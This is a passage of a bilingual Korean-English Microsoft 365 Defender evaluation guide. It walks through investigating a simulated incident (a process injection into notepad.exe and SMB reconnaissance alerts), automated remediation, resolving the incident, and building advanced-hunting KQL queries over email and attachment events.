<span data-ttu-id="eb80f-209">이 시나리오에서 프로세스 <i></i>notepad.exe외부 위치와의 통신과 관련된 비정상적인 동작이 표시됩니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-209">For this scenario, the process <i>notepad.exe</i> is exhibiting abnormal behavior, involving communication with an external location.</span></span> <span data-ttu-id="eb80f-210">이 결과는 악성 코드를 도입하고 실행하는 데 사용되는 특정 방법과는 독립적입니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-210">This outcome is independent of the specific method used to introduce and execute the malicious code.</span></span>

> [!NOTE]
> <span data-ttu-id="eb80f-211">이 경고는 추가 백엔드 처리가 필요한 기계 학습 모델을 기반으로 하기 때문에 포털에 이 경고가 표시되기까지 다소 시간이 걸릴 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-211">Because this alert is based on machine-learning models that require additional backend processing, it might take some time before you see this alert in the portal.</span></span>

<span data-ttu-id="eb80f-212">경고 세부 정보에는 조사를 확장하기 위해 피벗으로 사용할 수 있는 표시기인 외부 IP 주소가 포함되어 있습니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-212">Notice that the alert details include the external IP address—an indicator that you can use as a pivot to expand investigation.</span></span>

<span data-ttu-id="eb80f-213">IP 주소 세부 정보 페이지를 확인하려면 경고 프로세스 트리에서 IP 주소를 선택합니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-213">Select the IP address in the alert process tree to view the IP address details page.</span></span>

![명령줄 인수를 포함하지 않은 프로세스 실행으로 예기치 않은 동작에 대한 경고 스크린샷](../../media/mtp/fig8.png)

<span data-ttu-id="eb80f-215">다음 그림에는 선택한 IP 주소 세부 정보 페이지(경고 프로세스 트리에서 IP 주소 클릭)가 표시됩니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-215">The following figure displays the selected IP Address details page (clicking on IP address in the Alert process tree).</span></span>
<span data-ttu-id="eb80f-216">![IP 주소 세부 정보 페이지의 스크린샷](../../media/mtp/fig9.png)</span><span class="sxs-lookup"><span data-stu-id="eb80f-216">![Screenshot of the IP address details page](../../media/mtp/fig9.png)</span></span>

#### <a name="alert-user-and-ip-address-reconnaissance-smb-source-microsoft-defender-for-identity"></a><span data-ttu-id="eb80f-217">경고: SMB(사용자 및 IP 주소 정)(원본: ID용 Microsoft Defender)</span><span class="sxs-lookup"><span data-stu-id="eb80f-217">Alert: User and IP address reconnaissance (SMB) (Source: Microsoft Defender for Identity)</span></span>

<span data-ttu-id="eb80f-218">SMB(서버 메시지 블록) 프로토콜을 사용하여 열문을 사용하면 공격자가 최근 사용자 로그온 정보를 얻을 수 있습니다. 이 정보를 통해 공격자는 네트워크를 통해 먼 으로 이동하여 특정 중요한 계정에 액세스하는 데 도움이 됩니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-218">Enumeration using Server Message Block (SMB) protocol enables attackers to get recent user logon information that helps them move laterally through the network to access a specific sensitive account.</span></span>

<span data-ttu-id="eb80f-219">이 검색에서는 도메인 컨트롤러에 대해 SMB 세션 열호가 실행될 때 경고가 트리거됩니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-219">In this detection, an alert is triggered when the SMB session enumeration runs against a domain controller.</span></span>

![사용자 및 IP 주소 정 분석에 대한 ID에 대한 Microsoft Defender 경고 스크린샷](../../media/mtp/fig10.png)

### <a name="review-the-device-timeline-microsoft-defender-for-endpoint"></a><span data-ttu-id="eb80f-221">장치 타임라인 검토[끝점용 Microsoft Defender]</span><span class="sxs-lookup"><span data-stu-id="eb80f-221">Review the device timeline [Microsoft Defender for Endpoint]</span></span>

<span data-ttu-id="eb80f-222">이 인시던트에서 다양한 경고를 탐색한 후 앞에서 조사한 문제 페이지로 다시 이동합니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-222">After exploring the various alerts in this incident, navigate back to the incident page you investigated earlier.</span></span> <span data-ttu-id="eb80f-223">**인시던트** 페이지에서 장치 탭을 선택하여 끝점용 Microsoft Defender 및 ID용 Microsoft Defender에서 보고한 이 인시던트와 관련된 장치를 검토합니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-223">Select the **Devices** tab in the incident page to review the devices involved in this incident as reported by Microsoft Defender for Endpoint and Microsoft Defender for Identity.</span></span>

<span data-ttu-id="eb80f-224">공격이 수행된 디바이스의 이름을 선택하여 해당 특정 장치에 대한 엔터티 페이지를 열 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-224">Select the name of the device where the attack was conducted, to open the entity page for that specific device.</span></span> <span data-ttu-id="eb80f-225">해당 페이지에서 트리거된 경고 및 관련 이벤트를 볼 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-225">In that page, you can see alerts that were triggered and related events.</span></span>

<span data-ttu-id="eb80f-226">시간 표시 **막대 탭을** 선택하여 디바이스 타임라인을 열고 장치에서 관찰된 모든 이벤트 및 동작을 시간 순서대로 보고 경고가 발생했습니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-226">Select the **Timeline** tab to open the device timeline and view all events and behaviors observed on the device in chronological order, interspersed with the alerts raised.</span></span>

![동작이 있는 장치 타임라인 스크린샷](../../media/mtp/fig11.png)

<span data-ttu-id="eb80f-228">좀 더 흥미로운 동작 중 일부를 확장하면 프로세스 트리와 같은 유용한 세부 정보가 있습니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-228">Expanding some of the more interesting behaviors provides useful details, such as process trees.</span></span>

<span data-ttu-id="eb80f-229">예를 들어 경고 이벤트 의심스러운 프로세스 주입이 발견될 때까지 아래로 **스크롤합니다.**</span><span class="sxs-lookup"><span data-stu-id="eb80f-229">For example, scroll down until you find the alert event **Suspicious process injection observed**.</span></span> <span data-ttu-id="eb80f-230">왼쪽 **창의** powershell.exe 그래프 아래에 이 동작에 대한 전체 프로세스 트리를 표시하려면 notepad.exe  프로세스 이벤트에 삽입된 옵션을 선택합니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-230">Select the **powershell.exe injected to notepad.exe process** event below it, to display the full process tree for this behavior under the **Event entities** graph on the side pane.</span></span> <span data-ttu-id="eb80f-231">필요한 경우 필터링에 검색 표시줄을 사용하세요.</span><span class="sxs-lookup"><span data-stu-id="eb80f-231">Use the search bar for filtering if necessary.</span></span>

![선택한 PowerShell 파일 만들기 동작에 대한 프로세스 트리 스크린샷](../../media/mtp/fig12.png)

### <a name="review-the-user-information-microsoft-cloud-app-security"></a><span data-ttu-id="eb80f-233">사용자 정보 검토[Microsoft Cloud App Security]</span><span class="sxs-lookup"><span data-stu-id="eb80f-233">Review the user information [Microsoft Cloud App Security]</span></span>

<span data-ttu-id="eb80f-234">인시던트 페이지에서  사용자 탭을 선택하여 공격에 관련된 사용자 목록을 표시합니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-234">On the incident page, select the **Users** tab to display the list of users involved in the attack.</span></span> <span data-ttu-id="eb80f-235">이 표에는 각 사용자의 조사 우선 순위 점수를 포함하여 각 사용자에 대한 추가 **정보가 포함되어** 있습니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-235">The table contains additional information about each user, including each user's **Investigation Priority** score.</span></span>

<span data-ttu-id="eb80f-236">사용자 이름을 선택하여 추가 조사를 실시할 수 있는 사용자의 프로필 페이지를 열 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-236">Select the user name to open the user's profile page where further investigation can be conducted.</span></span> <span data-ttu-id="eb80f-237">[위험한 사용자 조사에 대해 자세히 읽어 를 읽어 읽습니다.](/cloud-app-security/tutorial-ueba#identify)</span><span class="sxs-lookup"><span data-stu-id="eb80f-237">[Read more about investigating risky users](/cloud-app-security/tutorial-ueba#identify).</span></span>

![Cloud App Security 사용자 페이지의 스크린샷](../../media/mtp/fig13.png)

## <a name="automated-investigation-and-remediation"></a><span data-ttu-id="eb80f-239">자동화된 조사 및 수정</span><span class="sxs-lookup"><span data-stu-id="eb80f-239">Automated investigation and remediation</span></span>

> [!NOTE]
><span data-ttu-id="eb80f-240">이 시뮬레이션을 진행하기 전에 다음 비디오를 시청하여 자동화된 자동 복구가 무엇일지, 포털에서 찾을 수 있는 위치 및 보안 작업에 도움이 되는지 익숙해지기 전에 다음 비디오를 시청해 봐야 합니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-240">Before we walk you through this simulation, watch the following video to get familiar with what automated self-healing is, where to find it in the portal, and how it can help in your security operations:</span></span>

> [!VIDEO https://www.microsoft.com/en-us/videoplayer/embed/RE4BzwB]

<span data-ttu-id="eb80f-241">Microsoft 365 보안 센터 포털에서 인시던트로 다시 이동합니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-241">Navigate back to the incident in the Microsoft 365 Security Center portal.</span></span> <span data-ttu-id="eb80f-242">**인시던트** 페이지의  조사 탭에는 ID에 대한 Microsoft Defender 및 끝점용 Microsoft Defender에서 트리거한 자동화된 조사가 표시됩니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-242">The **Investigations** tab in the **Incident** page shows the automated investigations that were triggered by Microsoft Defender for Identity and Microsoft Defender for Endpoint.</span></span> <span data-ttu-id="eb80f-243">아래 스크린샷에는 Endpoint용 Defender에서 트리거한 자동화된 조사만 표시됩니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-243">The screenshot below displays only the automated investigation triggered by Defender for Endpoint.</span></span> <span data-ttu-id="eb80f-244">기본적으로 Endpoint용 Defender는 큐에서 발견된 아티팩트를 자동으로 수정하여 수정해야 합니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-244">By default, Defender for Endpoint automatically remediates the artifacts found in the queue, which requires remediation.</span></span>

![인시던트와 관련된 자동화된 조사 스크린샷](../../media/mtp/fig14.png)

<span data-ttu-id="eb80f-246">조사를 트리거한 경고를 선택하여 조사 세부 정보 **페이지를 열** 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-246">Select the alert that triggered an investigation to open the **Investigation details** page.</span></span> <span data-ttu-id="eb80f-247">다음과 같은 세부 정보를 볼 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-247">You'll see the following details:</span></span>

- <span data-ttu-id="eb80f-248">자동화된 조사를 트리거한 경고입니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-248">Alert(s) that triggered the automated investigation.</span></span>
- <span data-ttu-id="eb80f-249">영향을 미치는 사용자 및 장치.</span><span class="sxs-lookup"><span data-stu-id="eb80f-249">Impacted users and devices.</span></span> <span data-ttu-id="eb80f-250">추가 장치에서 표시기가 발견되는 경우 이러한 추가 장치도 나열됩니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-250">If indicators are found on additional devices, these additional devices will be listed as well.</span></span>
- <span data-ttu-id="eb80f-251">증거 목록입니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-251">List of evidence.</span></span> <span data-ttu-id="eb80f-252">파일, 프로세스, 서비스, 드라이버 및 네트워크 주소와 같은 엔터티를 찾아 분석합니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-252">The entities found and analyzed, such as files, processes, services, drivers, and network addresses.</span></span> <span data-ttu-id="eb80f-253">이러한 엔터티는 경고와의 가능한 관계에 대해 분석하고 양성 또는 악의적인 것으로 등급이 지정됩니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-253">These entities are analyzed for possible relationships to the alert and rated as benign or malicious.</span></span>
- <span data-ttu-id="eb80f-254">위협이 발견됩니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-254">Threats found.</span></span> <span data-ttu-id="eb80f-255">조사 중에 발견된 알려진 위협입니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-255">Known threats that are found during the investigation.</span></span>

> [!NOTE]
> <span data-ttu-id="eb80f-256">시기에 따라 자동화된 조사가 계속 실행되고 있을 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-256">Depending on timing, the automated investigation might still be running.</span></span> <span data-ttu-id="eb80f-257">증거를 수집 및 분석하고 결과를 검토하기 전에 프로세스가 완료될 때까지 몇 분 정도 기다립니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-257">Wait a few minutes for the process to complete before you collect and analyze the evidence and review the results.</span></span> <span data-ttu-id="eb80f-258">조사 **세부 정보 페이지를 새로** 고쳐 최신 결과를 얻습니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-258">Refresh the **Investigation details** page to get the latest findings.</span></span>

![조사 세부 정보 페이지의 스크린샷](../../media/mtp/fig15.png)

<span data-ttu-id="eb80f-260">자동화된 조사 중에 끝점용 Microsoft Defender는 수정이 notepad.exe 아티팩트 중 하나로 주입된 프로세스가 확인되었습니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-260">During the automated investigation, Microsoft Defender for Endpoint identified the notepad.exe process, which was injected as one of the artifacts requiring remediation.</span></span> <span data-ttu-id="eb80f-261">Endpoint용 Defender는 자동화된 수정의 일부로 의심스러운 프로세스 삽입을 자동으로 중지합니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-261">Defender for Endpoint automatically stops the suspicious process injection as part of the automated remediation.</span></span>

<span data-ttu-id="eb80f-262">테스트 장치에서 <i>notepad.exe</i> 프로세스 목록에서 사라지는 과정을 볼 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-262">You can see <i>notepad.exe</i> disappear from the list of running processes on the test device.</span></span>

## <a name="resolve-the-incident"></a><span data-ttu-id="eb80f-263">인시던트 해결</span><span class="sxs-lookup"><span data-stu-id="eb80f-263">Resolve the incident</span></span>

<span data-ttu-id="eb80f-264">조사가 완료된 후 수정이 확인되면 인시던트 닫습니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-264">After the investigation is complete and confirmed to be remediated, close the incident.</span></span>

<span data-ttu-id="eb80f-265">**인시던트 관리를 선택합니다.**</span><span class="sxs-lookup"><span data-stu-id="eb80f-265">Select **Manage incident**.</span></span> <span data-ttu-id="eb80f-266">상태를 문제 **해결로** 설정하고 관련 분류를 선택합니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-266">Set the status to **Resolve incident** and select the relevant classification.</span></span>

<span data-ttu-id="eb80f-267">인시던트가 해결되면 Microsoft 365 보안 센터 및 관련 포털에서 모든 관련 알림을 닫습니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-267">When the incident is resolved, it closes all of the associated alerts in Microsoft 365 Security Center and in the related portals.</span></span>

![문제 해결을 위해 스위치를 클릭할 수 있는 열린 문제 관리 패널이 있는 문제 페이지의 스크린샷](../../media/mtp/fig16.png)

<span data-ttu-id="eb80f-269">그러면 인시던트 관리 및 자동화된 조사 및 수정 시나리오에 대한 공격 시뮬레이션이 마무리됩니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-269">This wraps up the attack simulation for the incident management and automated investigation and remediation scenarios.</span></span> <span data-ttu-id="eb80f-270">다음 시뮬레이션을 통해 잠재적인 악성 파일에 대한 사전 위협 헌팅을 진행할 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-270">The next simulation will take you through proactive threat hunting for potentially malicious files.</span></span>

## <a name="advanced-hunting-scenario"></a><span data-ttu-id="eb80f-271">고급 헌팅 시나리오</span><span class="sxs-lookup"><span data-stu-id="eb80f-271">Advanced hunting scenario</span></span>

> [!NOTE]
> <span data-ttu-id="eb80f-272">시뮬레이션을 진행하기 전에 다음 비디오를 시청하여 고급 헌팅 개념을 이해하고 포털에서 찾을 수 있는 위치를 확인하며 보안 작업에 도움이 되는 방법을 파악합니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-272">Before we walk you through the simulation, watch the following video to understand the advanced hunting concepts, see where you can find it in the portal, and know how it can help you in your security operations:</span></span>

> [!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bp7O]

### <a name="hunting-environment-requirements"></a><span data-ttu-id="eb80f-273">헌팅 환경 요구 사항</span><span class="sxs-lookup"><span data-stu-id="eb80f-273">Hunting environment requirements</span></span>

<span data-ttu-id="eb80f-274">이 시나리오에는 단일 내부 사서함 및 장치가 필요합니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-274">There's a single internal mailbox and device required for this scenario.</span></span> <span data-ttu-id="eb80f-275">테스트 메시지를 보내기 위해 외부 전자 메일 계정도 필요합니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-275">You'll also need an external email account to send the test message.</span></span>

1. <span data-ttu-id="eb80f-276">테넌트에서 [Microsoft 365 Defender를 사용하도록 설정되어 있는지 확인합니다.](m365d-enable.md#confirm-that-the-service-is-on)</span><span class="sxs-lookup"><span data-stu-id="eb80f-276">Verify that your tenant has [enabled Microsoft 365 Defender](m365d-enable.md#confirm-that-the-service-is-on).</span></span>
2. <span data-ttu-id="eb80f-277">전자 메일을 받는 데 사용할 대상 사서함을 식별합니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-277">Identify a target mailbox to be used for receiving email.</span></span>
    <span data-ttu-id="eb80f-278">a.</span><span class="sxs-lookup"><span data-stu-id="eb80f-278">a.</span></span> <span data-ttu-id="eb80f-279">이 사서함은 Microsoft Defender for Office 365 b에서 모니터링해야 합니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-279">This mailbox must be monitored by Microsoft Defender for Office 365 b.</span></span> <span data-ttu-id="eb80f-280">요구 사항 3의 장치가 이 사서함에 액세스해야 합니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-280">The device from requirement 3 needs to access this mailbox</span></span>
3. <span data-ttu-id="eb80f-281">테스트 장치 구성: a.</span><span class="sxs-lookup"><span data-stu-id="eb80f-281">Configure a test device: a.</span></span> <span data-ttu-id="eb80f-282">Windows 10 버전 1903 이상 버전을 사용하고 있는지 확인</span><span class="sxs-lookup"><span data-stu-id="eb80f-282">Make sure you are using Windows 10 version 1903 or later version.</span></span>
    <span data-ttu-id="eb80f-283">b.</span><span class="sxs-lookup"><span data-stu-id="eb80f-283">b.</span></span> <span data-ttu-id="eb80f-284">테스트 장치를 테스트 도메인에 가입합니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-284">Join the test device to the test domain.</span></span>
    <span data-ttu-id="eb80f-285">c.</span><span class="sxs-lookup"><span data-stu-id="eb80f-285">c.</span></span> <span data-ttu-id="eb80f-286">[바이러스 백신을 Windows Defender 을 상태로 합니다.](/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features)</span><span class="sxs-lookup"><span data-stu-id="eb80f-286">[Turn on Windows Defender Antivirus](/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features).</span></span> <span data-ttu-id="eb80f-287">If you are having trouble enabling Windows Defender Antivirus, see [this troubleshooting topic](/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy).</span><span class="sxs-lookup"><span data-stu-id="eb80f-287">If you are having trouble enabling Windows Defender Antivirus, see [this troubleshooting topic](/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy).</span></span>
    <span data-ttu-id="eb80f-288">d.</span><span class="sxs-lookup"><span data-stu-id="eb80f-288">d.</span></span> <span data-ttu-id="eb80f-289">[끝점용 Microsoft Defender에 온보딩합니다.](/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints)</span><span class="sxs-lookup"><span data-stu-id="eb80f-289">[Onboard to Microsoft Defender for Endpoint](/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).</span></span>

### <a name="run-the-simulation"></a><span data-ttu-id="eb80f-290">시뮬레이션 실행</span><span class="sxs-lookup"><span data-stu-id="eb80f-290">Run the simulation</span></span>

1. <span data-ttu-id="eb80f-291">외부 전자 메일 계정에서 테스트 환경 요구 사항 섹션의 2단계에서 식별된 사서함으로 전자 메일을 전송합니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-291">From an external email account, send an email to the mailbox identified in step 2 of the test environment requirements section.</span></span> <span data-ttu-id="eb80f-292">기존 전자 메일 필터 정책을 통해 허용되는 첨부 파일을 포함합니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-292">Include an attachment that will be allowed through any existing email filter policies.</span></span> <span data-ttu-id="eb80f-293">이 파일은 악성 파일이나 실행 파일이 아니어도 됩니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-293">This file does not need to be malicious or an executable.</span></span> <span data-ttu-id="eb80f-294">제안되는 파일 형식은 <i>.pdf,</i> <i>.exe(허용되는</i> 경우) 또는 Office 문서(예: Word 파일)입니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-294">Suggested file types are <i>.pdf</i>, <i>.exe</i> (if allowed), or Office document such as a Word file.</span></span>
2. <span data-ttu-id="eb80f-295">테스트 환경 요구 사항 섹션의 3단계에 정의된 것으로 구성된 장치에서 보낸 전자 메일을 열 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-295">Open the sent email from the device configured as defined in step 3 of the test environment requirements section.</span></span> <span data-ttu-id="eb80f-296">첨부 파일을 열거나 장치에 파일을 저장합니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-296">Either open the attachment or save the file to the device.</span></span>

#### <a name="go-hunting"></a><span data-ttu-id="eb80f-297">헌팅으로 이동</span><span class="sxs-lookup"><span data-stu-id="eb80f-297">Go hunting</span></span>

1. <span data-ttu-id="eb80f-298">포털을 security.microsoft.com 을 열 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-298">Open the security.microsoft.com portal.</span></span>

2. <span data-ttu-id="eb80f-299">고급 **헌팅 > 헌팅으로 이동합니다.**</span><span class="sxs-lookup"><span data-stu-id="eb80f-299">Navigate to **Hunting > Advanced hunting**.</span></span>

   ![M365 보안 센터 포털 탐색 모음의 고급 헌팅 스크린샷](../../media/mtp/fig17.png)

3. <span data-ttu-id="eb80f-301">전자 메일 이벤트를 수집하여 시작하는 쿼리를 작성합니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-301">Build a query that starts by gathering email events.</span></span>

   1. <span data-ttu-id="eb80f-302">쿼리 창에서 새로 고치기 를 선택합니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-302">From the query pane, select New.</span></span>

   1. <span data-ttu-id="eb80f-303">Schema에서 EmailEvents 테이블을 두 번 클릭합니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-303">Double-click on the EmailEvents table from the schema.</span></span>

      ```console
      EmailEvents
      ```

   1. <span data-ttu-id="eb80f-304">시간 프레임을 지난 24시간으로 변경합니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-304">Change the time frame to the last 24 hours.</span></span> <span data-ttu-id="eb80f-305">위의 시뮬레이션을 실행할 때 보낸 전자 메일이 지난 24시간 동안의 경우 그렇지 않으면 시간 프레임을 변경합니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-305">Assuming the email you sent when you ran the simulation above was in the past 24 hours, otherwise change the time frame.</span></span>

      ![시간 프레임을 변경할 수 있는 위치의 스크린샷.](../../media/mtp/fig18.png)

   1. <span data-ttu-id="eb80f-308">쿼리를 실행합니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-308">Run the query.</span></span> <span data-ttu-id="eb80f-309">파일럿 환경에 따라 결과가 다를 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-309">You may have many results depending on the environment for the pilot.</span></span>

      > [!NOTE]
      > <span data-ttu-id="eb80f-310">데이터 반환을 제한하는 필터링 옵션에 대한 다음 단계를 참조하세요.</span><span class="sxs-lookup"><span data-stu-id="eb80f-310">See the next step for filtering options to limit data return.</span></span>

      ![고급 헌팅 쿼리 결과 스크린샷](../../media/mtp/fig19.png)

        > [!NOTE]
        > <span data-ttu-id="eb80f-312">고급 헌팅은 쿼리 결과를 테이블형 데이터로 표시됩니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-312">Advanced hunting displays query results as tabular data.</span></span> <span data-ttu-id="eb80f-313">차트와 같은 다른 형식의 데이터를 볼 수도 있습니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-313">You can also opt to view the data in other format types such as charts.</span></span>

   1. <span data-ttu-id="eb80f-314">결과를 확인하고 연 전자 메일을 식별할 수 있는지 봐야 합니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-314">Look at the results and see if you can identify the email you opened.</span></span> <span data-ttu-id="eb80f-315">고급 헌팅에 메시지가 표시될 때 최대 2시간이 걸릴 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-315">It may take up to 2 hours for the message to show up in advanced hunting.</span></span> <span data-ttu-id="eb80f-316">전자 메일 환경이 크고 결과가 많은 경우 필터 표시  옵션을 사용하여 메시지를 찾을 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-316">If the email environment is large and there are many results, you might want to use the **Show Filters option** to find the message.</span></span>

      <span data-ttu-id="eb80f-317">샘플에서 전자 메일은 Yahoo 계정에서 전송됩니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-317">In the sample, the email was sent from a Yahoo account.</span></span> <span data-ttu-id="eb80f-318">**+** SenderFromDomain **yahoo.com** 옆에 있는 아이콘을 클릭한 다음  적용을 클릭하여 선택한 도메인을 쿼리에 추가합니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-318">Click the **+** icon beside **yahoo.com** under the SenderFromDomain section and then click **Apply** to add the selected domain to the query.</span></span> <span data-ttu-id="eb80f-319">시뮬레이션 실행의 1단계에서 테스트 메시지를 보내는 데 사용된 도메인 또는 전자 메일 계정을 사용하여 결과를 필터링합니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-319">Use the domain or email account that was used to send the test message in step 1 of Run the Simulation to filter your results.</span></span> <span data-ttu-id="eb80f-320">쿼리를 다시 실행하여 더 작은 결과 집합을 확인하여 시뮬레이션에서 메시지가 표시되어 있는지를 확인할 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-320">Run the query again to get a smaller result set to verify that you see the message from the simulation.</span></span>

      ![필터 스크린샷.](../../media/mtp/fig20.png)

      ```console
      EmailEvents
      | where SenderMailFromDomain == "yahoo.com"
      ```

   1. <span data-ttu-id="eb80f-323">레코드를 검사할 수 있도록 쿼리에서 결과 행을 클릭합니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-323">Click the resulting rows from the query so you can inspect the record.</span></span>

      ![고급 헌팅 결과가 선택될 때 열 수 있는 조사 레코드 사이드 패널의 스크린샷](../../media/mtp/fig21.png)

4. <span data-ttu-id="eb80f-325">이제 전자 메일을 볼 수 있는 것으로 확인되면 첨부 파일에 대한 필터를 추가합니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-325">Now that you have verified that you can see the email, add a filter for the attachments.</span></span> <span data-ttu-id="eb80f-326">환경의 첨부 파일이 있는 모든 전자 메일에 집중합니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-326">Focus on all emails with attachments in the environment.</span></span> <span data-ttu-id="eb80f-327">이 시나리오에서는 사용자 환경에서 전송되는 전자 메일이 아니라 인바운드 전자 메일에 중점을 니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-327">For this scenario, focus on inbound emails, not those that are being sent out from your environment.</span></span> <span data-ttu-id="eb80f-328">메시지를 찾기 위해 추가한 필터를 제거하고 "| 여기서 **AttachmentCount > 및** **EmailDirection**  ==  **"Inbound""**</span><span class="sxs-lookup"><span data-stu-id="eb80f-328">Remove any filters you have added to locate your message and add "| where **AttachmentCount > 0** and **EmailDirection** == **"Inbound""**</span></span>

   <span data-ttu-id="eb80f-329">다음 쿼리는 모든 전자 메일 이벤트에 대한 초기 쿼리보다 짧은 목록으로 결과를 보여 주게 됩니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-329">The following query will show you the result with a shorter list than your initial query for all email events:</span></span>

   ```console
   EmailEvents
   | where AttachmentCount > 0 and EmailDirection == "Inbound"
   ```

5. <span data-ttu-id="eb80f-330">그런 다음 결과 집합에 첨부 파일에 대한 정보(예: 파일 이름, 해시)를 포함합니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-330">Next, include the information about the attachment (such as: file name, hashes) to your result set.</span></span> <span data-ttu-id="eb80f-331">이렇게 하여 **EmailAttachmentInfo** 테이블을 조인합니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-331">To do so, join the **EmailAttachmentInfo** table.</span></span> <span data-ttu-id="eb80f-332">조인에 사용할 일반 필드는 **NetworkMessageId** 및 **RecipientObjectId입니다.**</span><span class="sxs-lookup"><span data-stu-id="eb80f-332">The common fields to use for joining, in this case are **NetworkMessageId** and **RecipientObjectId**.</span></span>

   <span data-ttu-id="eb80f-333">다음 쿼리에는 "| **project-rename EmailTimestamp=Timestamp**" - 다음 단계에서 추가할 파일 작업과 관련된 타임스탬프와 전자 메일과 관련된 타임스탬프를 식별하는 데 도움이 됩니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-333">The following query also includes an additional line "| **project-rename EmailTimestamp=Timestamp**" that'll help identify which timestamp was related to the email versus timestamps related to file actions that you'll add in the next step.</span></span>

   ```console
   EmailEvents
   | where AttachmentCount > 0 and EmailDirection == "Inbound"
   | project-rename EmailTimestamp=Timestamp
   | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
   ```

6. <span data-ttu-id="eb80f-334">그런 다음 **EmailAttachmentInfo** 테이블의 **SHA256** 값을 사용하여 해당 해시에 대한 **DeviceFileEvents(끝점에서** 수행된 파일 작업)를 확인합니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-334">Next, use the **SHA256** value from the **EmailAttachmentInfo** table to find **DeviceFileEvents** (file actions that happened on the endpoint) for that hash.</span></span> <span data-ttu-id="eb80f-335">여기서 공통 필드는 첨부 파일에 대한 SHA256 해시입니다.</span><span class="sxs-lookup"><span data-stu-id="eb80f-335">The common field here will be the SHA256 hash for the attachment.</span></span>

